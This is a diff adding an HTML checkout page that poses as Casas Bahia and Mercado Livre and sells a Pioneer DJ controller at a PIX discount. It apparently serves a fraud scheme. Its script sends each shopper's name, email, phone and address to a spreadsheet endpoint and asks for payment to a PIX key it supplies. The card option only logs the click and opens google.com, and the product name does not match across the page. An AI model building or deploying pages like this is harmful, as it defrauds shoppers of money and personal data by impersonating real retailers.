@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout - Casas Bahia</title>
+<meta name="description" content="Finalize sua compra do Mixer Pioneer DJ DJM-A9 nas Casas Bahia. Processo de checkout seguro e rápido.">
+<meta name="robots" content="noindex, nofollow">
+<style>
+:root {
+    --bg-main: #fefefe;
+    --bg-secondary: #ededed;
+    --text-main: #292927;
+    --text-secondary: #000000;
+    --accent: #ff8533;
+    --accent-hover: #e06e00;
+    --border-color: #333;
+    --pix-green: #f1f1f1;
+    --pix-green-hover: #00b347;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: var(--bg-main);
+    color: var(--text-main);
+    line-height: 1.6;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+.container { width: 90%; max-width: 800px; margin: 0 auto; }
+
+h1, h2 { color: #000000; margin-bottom: 1rem; text-align: center; }
+h1 { font-size: 2.5rem; margin-top: 2rem; }
+h2 { font-size: 1.8rem; color: var(--accent); }
+
+p { color: var(--text-secondary); }
+
+.header, .footer { background-color: var(--bg-secondary); padding: 1rem 0; text-align: center; }
+.logo { font-size: 1.5rem; font-weight: bold; color: #fff; text-decoration: none; }
+.footer { margin-top: auto; padding: 2rem 0; color: var(--text-secondary); font-size: 0.9rem; }
+
+main { padding: 40px 0; flex-grow: 1; }
+
+.checkout-layout { display: flex; flex-direction: column; gap: 2rem; }
+
+.resumo-pedido, .form-checkout {
+    background-color: var(--bg-secondary);
+    padding: 2rem;
+    border-radius: 10px;
+    border: 1px solid var(--border-color);
+}
+
+.resumo-pedido ul { list-style: none; }
+.resumo-pedido li {
+    display: flex;
+    justify-content: space-between;
+    padding: 0.8rem 0;
+    font-size: 1.1rem;
+    border-bottom: 1px solid var(--border-color);
+}
+.resumo-pedido li:last-child { border-bottom: none; }
+.resumo-pedido .total {
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: var(--accent);
+    margin-top: 1rem;
+}
+
+.form-group { margin-bottom: 1.5rem; }
+
+.form-checkout label {
+    display: block;
+    margin-bottom: 0.5rem;
+    font-weight: 500;
+    color: #313131;
+}
+
+.form-checkout input {
+    width: 100%;
+    padding: 12px;
+    background-color: var(--bg-main);
+    border: 1px solid var(--border-color);
+    border-radius: 5px;
+    font-size: 1rem;
+    color: #000000;
+}
+
+.form-checkout input::placeholder { color: #0d0d0daa; }
+
+.form-group input:focus { outline: none; border-color: var(--accent); }
+
+.submit-btn {
+    width: 100%;
+    padding: 15px;
+    background-color: var(--accent);
+    color: #ffffff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1.2rem;
+    font-weight: bold;
+    text-transform: uppercase;
+    transition: background-color 0.3s ease;
+}
+.submit-btn:hover { background-color: var(--accent-hover); }
+
+.payment-selection {
+    background-color: #ffffff;
+    padding: 2rem;
+    border-radius: 10px;
+    border: 1px solid var(--border-color);
+}
+
+.payment-options { display: flex; gap: 1rem; margin-bottom: 2rem; }
+.payment-option {
+    flex: 1;
+    padding: 1.5rem;
+    background-color: #ffffff;
+    border: 2px solid var(--border-color);
+    border-radius: 10px;
+    cursor: pointer;
+    text-align: center;
+    transition: all 0.3s ease;
+    color: var(--text-main);
+}
+.payment-option:hover { border-color: var(--accent); background-color: #cdffbf; }
+.payment-option.selected { border-color: var(--accent); background-color: rgba(255, 175, 47, 0.2); }
+
+.payment-option.pix-option { background-color: var(--pix-green); border-color: #009739; }
+.payment-option.pix-option.selected { background-color: #a8f5a8; border-color: #00b347; }
+
+.payment-option h3 { margin-bottom: 0.5rem; }
+.payment-option p { font-size: 0.9rem; color: var(--text-secondary); }
+.payment-option .desconto-badge {
+    background-color: #009739;
+    color: #fff;
+    padding: 5px 10px;
+    border-radius: 15px;
+    font-size: 0.8rem;
+    font-weight: bold;
+    margin-top: 0.5rem;
+    display: inline-block;
+}
+
+.error-message { color: #ff4d4d; font-size: 0.9rem; margin-top: 5px; display: none; }
+input.invalid { border-color: #ff4d4d; }
+
+.secao-pix { margin-top: 2rem; display: none; flex-direction: column; gap: 2rem; }
+
+.pagamento-opcao {
+    background-color: #ffffff;
+    padding: 1rem;
+    border: 1px solid var(--border-color);
+    border-radius: 10px;
+}
+.pagamento-opcao img { max-width: 250px; display: block; margin: 0 auto 1rem; }
+
+.chave-pix-container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+}
+.chave-pix-info { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; flex: 1; }
+.chave-pix-valor {
+    background-color: #a9a9a9;
+    padding: 10px;
+    border-radius: 5px;
+    font-family: monospace;
+    word-break: break-all;
+}
+
+.copiar-btn {
+    padding: 8px 15px;
+    background-color: #009739;
+    color: #000000;
+    border: 1px solid #007a30;
+    border-radius: 5px;
+    cursor: pointer;
+    white-space: nowrap;
+    font-weight: bold;
+}
+.copiar-btn:hover { background-color: #00b347; color: #000; }
+
+.header {
+    background-color: #ffee00;
+    color: #000000;
+    border-bottom: 1px solid #bdbdbd;
+}
+.header .logo { color: #000000; }
+
+.resumo-pedido {
+    background: #fff;
+    border-radius: 12px;
+    padding: 20px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    margin-bottom: 20px;
+}
+
+.produto-resumo { display: flex; align-items: center; gap: 15px; }
+.imagem-produto { width: 300px; border-radius: 10px; }
+.info-produto { flex: 1; }
+.total { font-size: 1.1rem; color: #000; }
+.desconto-pix {
+    background: #e8ffe8;
+    border: 1px solid #8bc34a;
+    padding: 10px;
+    border-radius: 8px;
+    color: #2e7d32;
+    margin-top: 10px;
+}
+.detalhe-desconto { font-size: 0.85rem; color: #555; }
+
+</style>
+</head>
+
+<body>
+<header class="header">
+    <div class="container" style="text-align: center;">
+        <a href="index.html">
+            <img src="logomp.png" alt="Logo" style="max-width: 250px; height: auto; display: inline-block;">
+        </a>
+    </div>
+</header>
+
+<main>
+    <div class="container">
+        <h1>Finalizar Compra</h1>
+        <div class="checkout-layout">
+
+            <!-- RESUMO -->
+            <section id="resumo-pedido" class="resumo-pedido">
+                <h2>Resumo do Pedido</h2>
+                <div class="produto-resumo">
+                    <img src="ddj1000srt.png" alt="Produto" class="imagem-produto">
+                    <div class="info-produto">
+                        <h3 id="produto-nome">Controlador Pioneer DDJ 1000SRT - SERATO</h3>
+                        <p><strong>Valor Original:</strong> <span id="produto-preco-original">R$ 7.100,00</span></p>
+                        <p><strong>Valor do Produto:</strong> <span id="produto-preco">R$ 7.100,00</span></p>
+                        <p><strong>Frete:</strong> <span id="frete-valor">R$ 0,00</span></p>
+                        <hr>
+                        <p class="total"><strong>Total a Pagar:</strong> <span id="total-valor">R$ 7.100,00</span></p>
+                        <div id="desconto-pix-linha" style="display:none; justify-content: space-between;">
+                            <strong>Desconto PIX:</strong> <span id="desconto-valor">- R$ 0,00</span>
+                        </div>
+                        <p class="desconto-pix">
+                            💰 <strong>Por R$ 6.390,00 no PIX</strong><br>
+                            <span class="detalhe-desconto">10% de desconto aplicável somente para pagamento via PIX.</span>
+                        </p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- FORMULÁRIO -->
+            <section id="secao-formulario">
+                <form id="checkout-form" class="form-checkout" novalidate>
+                    <h2>Seus Dados</h2>
+                    <div class="form-group"><label for="nome">Nome Completo</label><input type="text" id="nome" name="nome" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="email">E-mail</label><input type="email" id="email" name="email" required><p class="error-message">Por favor, insira um e-mail válido.</p></div>
+                    <div class="form-group"><label for="telefone">Telefone</label><input type="tel" id="telefone" name="telefone" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="cep">CEP</label><input type="text" id="cep" name="cep" maxlength="9" placeholder="Digite o CEP" onblur="buscarCEP()"><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="endereco">Endereço</label><input type="text" id="endereco" name="endereco" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="numero">Número</label><input type="text" id="numero" name="numero" required placeholder="Número da residência"><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="cidade">Cidade</label><input type="text" id="cidade" name="cidade" required><p class="error-message">Campo obrigatório.</p></div>
+                    <div class="form-group"><label for="estado">Estado</label><input type="text" id="estado" name="estado" required><p class="error-message">Campo obrigatório.</p></div>
+                    <button type="submit" class="submit-btn">Continuar para Pagamento</button>
+                </form>
+            </section>
+
+            <!-- PAGAMENTO -->
+            <section id="payment-selection" class="payment-selection" style="display: none;">
+                <h2>Escolha a Forma de Pagamento</h2>
+                <div class="payment-options">
+                    <div class="payment-option pix-option" data-payment="pix"><div class="payment-icon">📱</div><h3>PIX</h3><p>Pagamento instantâneo via PIX</p><div class="desconto-badge">10% de desconto</div></div>
+                    <div class="payment-option" data-payment="cartao"><div class="payment-icon">💳</div><h3>Cartão de Crédito</h3><p>Parcelamento em até 12x</p><p style="font-size: 0.8rem; margin-top: 0.5rem;">1,99% a.m. de juros</p></div>
+                </div>
+                <button id="confirm-payment-btn" class="submit-btn" style="display: none;">Confirmar Forma de Pagamento</button>
+            </section>
+
+            <!-- PIX -->
+            <section id="secao-pix" class="secao-pix"></section>
+
+        </div>
+    </div>
+</main>
+
+<footer class="footer">
+    <div class="container" style="display: flex; align-items: center; justify-content: space-between;">
+        <p style="margin: 0; text-align: center; flex:1;">COMPRA SEGURA &copy; 2025 Mercado Livre - Mercado Pago . Todos os direitos reservados.</p>
+        <img src="selosslcomprasegura.webp" style="max-width: 200px; height: auto; flex:1;">
+    </div>
+</footer>
+
+<script>
+const produto = {nome: "Mixer Pioneer DJ DJM-A9", preco: 7100};
+const produtoPrecoOriginal = produto.preco;
+const descontoPix = 0.10; // 10%
+let precoPixComDesconto = Math.round(produtoPrecoOriginal * (1 - descontoPix));
+let totalAPagar = precoPixComDesconto; 
+const frete = 0;
+const chavePix = "12345678-9"; // substitua pela sua chave
+
+// FORMULÁRIO
+const form = document.getElementById("checkout-form");
+const paymentSelection = document.getElementById("payment-selection");
+const paymentOptions = document.querySelectorAll(".payment-option");
+const confirmPaymentBtn = document.getElementById("confirm-payment-btn");
+const secaoPix = document.getElementById("secao-pix");
+
+form.addEventListener('submit', function(e){
+    e.preventDefault();
+    let valid = true;
+    form.querySelectorAll("input").forEach(input=>{
+        if(!input.value.trim()){
+            valid = false;
+            input.classList.add('invalid');
+            input.nextElementSibling.style.display = 'block';
+        }else{
+            input.classList.remove('invalid');
+            input.nextElementSibling.style.display = 'none';
+        }
+    });
+    if(!valid) return;
+
+    // Mostrar opções de pagamento
+    paymentSelection.style.display = 'block';
+    confirmPaymentBtn.style.display = 'block';
+    confirmPaymentBtn.scrollIntoView({behavior:'smooth'});
+});
+
+// Seleção de pagamento
+let selectedPayment = null;
+paymentOptions.forEach(option=>{
+    option.addEventListener('click', ()=>{
+        paymentOptions.forEach(o=>o.classList.remove('selected'));
+        option.classList.add('selected');
+        selectedPayment = option.dataset.payment;
+    });
+});
+
+// Confirmar pagamento
+confirmPaymentBtn.addEventListener('click', function() {
+    if(!selectedPayment) return alert("Selecione uma forma de pagamento.");
+    
+    const formData = new FormData(form);
+    const clienteNome = formData.get('nome');
+    const clienteEmail = formData.get('email');
+    const clienteTelefone = formData.get('telefone');
+    const clienteCep = formData.get('cep');
+    const clienteEndereco = formData.get('endereco') + ", " + formData.get('numero');
+    const clienteCidade = formData.get('cidade');
+    const clienteEstado = formData.get('estado');
+
+    // Dados básicos
+    const dadosBasicos = {
+        produto: produto.nome,
+        precoOriginal: produtoPrecoOriginal,
+        desconto: selectedPayment==='pix' ? Math.round(produtoPrecoOriginal * descontoPix) : 0,
+        precoComDesconto: selectedPayment==='pix' ? precoPixComDesconto : produtoPrecoOriginal,
+        frete: frete,
+        valorTotal: selectedPayment==='pix' ? totalAPagar : produtoPrecoOriginal,
+        cliente: clienteNome,
+        email: clienteEmail,
+        telefone: clienteTelefone,
+        endereco: clienteEndereco,
+        cidade: clienteCidade,
+        estado: clienteEstado,
+        cep: clienteCep,
+        chavePix: selectedPayment==='pix' ? chavePix : '',
+        dataHora: new Date().toLocaleString('pt-BR')
+    };
+
+// Se for PIX → fluxo normal
+if (selectedPayment === 'pix') {
+    fetch('/api/enviar-para-sheets', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ tipo: 'pix_gerado', dados: dadosBasicos })
+    }).then(resp => {
+        if (resp.ok) console.log('Enviado PIX para Sheets');
+    }).catch(err => console.log('Erro Sheets', err));
+
+    const qrcodeHtml = '<img src="qrcode.svg" alt="QR Code ' + produto.nome + '" onerror="this.style.display=\'none\'">';
+    secaoPix.innerHTML = `
+    <div class="pagamento-opcao">
+        <h3 style="color: #000;">Escaneie o QR Code</h3>
+        <p>Abra o aplicativo do seu banco e escaneie o código abaixo:</p>
+        ${qrcodeHtml}
+        <h4>Ou copie a chave Pix:</h4>
+        <div class="chave-pix-container">
+            <div class="chave-pix-info">
+                <div class="chave-pix-valor">${chavePix}</div>
+            </div>
+            <button class="copiar-btn" onclick="copiarChave('${chavePix}')">Copiar Chave</button>
+        </div>
+
+        <p style="margin-top: 1rem; font-size: 1.2rem; font-weight: bold; color: #000;">
+            Valor: R$ ${totalAPagar.toLocaleString('pt-BR',{minimumFractionDigits:2})}
+        </p>
+        <p style="margin-top: 0.5rem; color: #000;">✓ Desconto de 10% aplicado</p>
+        
+        <!-- 🟢 Instruções PIX resumidas -->
+        <div style="margin-top: 1.2rem; background: #f7f7f7; border-radius: 10px; padding: 1rem; font-size: 0.95rem; color: #333;">
+            <h3 style="color: #000; font-size: 1.05rem; margin-bottom: 0.6rem;">💳 Como pagar com Pix</h3>
+            <p style="margin: 0.3rem 0;">
+                • <b>Escaneie o QR Code</b> com o app do seu banco<br>
+                • Ou clique em <b>Copiar Chave</b> e cole no Pix do seu banco
+            </p>
+            <p style="margin-top: 0.6rem; color: #555;">
+                💡 Após o pagamento, seu pedido será confirmado automaticamente.
+            </p>
+        </div>
+
+        <p style="margin-top: 1rem; color: var(--text-secondary);">
+            📧 Um email de confirmação será enviado para ${clienteEmail}
+        </p>
+    </div>`;
+
+    secaoPix.style.display = 'flex';
+    secaoPix.scrollIntoView({ behavior: 'smooth' });
+
+} else if (selectedPayment === 'cartao') {
+    // Se for CARTÃO → envia “clicou” na coluna Y da aba “DDJ1000SRT”
+    const dadosCartao = { ...dadosBasicos, status: 'clicou' };
+    
+    fetch('/api/enviar-para-sheets', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ tipo: 'cartao_clicou', aba: 'DDJ1000SRT', dados: dadosCartao })
+    }).then(resp => {
+        if (resp.ok) console.log('Cartão clicou enviado para Sheets');
+    }).catch(err => console.log('Erro Sheets', err));
+
+    window.open('https://www.google.com/', '_blank');
+}
+});
+
+// Copiar chave PIX
+function copiarChave(chave){
+    navigator.clipboard.writeText(chave);
+    alert("Chave Pix copiada!");
+}
+
+// Buscar CEP via API (Exemplo via viacep)
+function buscarCEP(){
+    const cep = document.getElementById("cep").value.replace(/\D/g,'');
+    if(cep.length!==8) return;
+    fetch(`https://viacep.com.br/ws/${cep}/json/`).then(resp=>resp.json()).then(data=>{
+        if(data.erro) return;
+        document.getElementById("endereco").value = data.logradouro || '';
+        document.getElementById("cidade").value = data.localidade || '';
+        document.getElementById("estado").value = data.uf || '';
+    }).catch(err=>console.log("Erro ao buscar CEP",err));
+}
+</script>
+</body>
+</html>
